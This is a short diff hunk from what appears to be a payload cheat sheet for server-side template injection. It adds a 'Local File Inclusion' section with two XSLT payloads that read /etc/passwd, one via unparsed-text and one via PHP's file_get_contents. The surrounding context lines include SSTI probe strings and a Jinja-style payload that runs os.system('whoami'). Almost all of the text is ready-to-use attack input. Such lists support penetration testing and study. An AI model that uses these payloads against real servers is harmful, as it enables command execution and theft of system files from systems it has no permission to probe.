@@ -120,6 +120,14 @@ ${7*7}
 ${{<%[%'"}}%\
 {% import os %}{{os.system('whoami')}}
 ```
+
+###Local File Inclusion (LFI)
+```
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+```
+```
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+```
 ### tplmap.py
 ### SSTI Exploitation Example 1
 ```
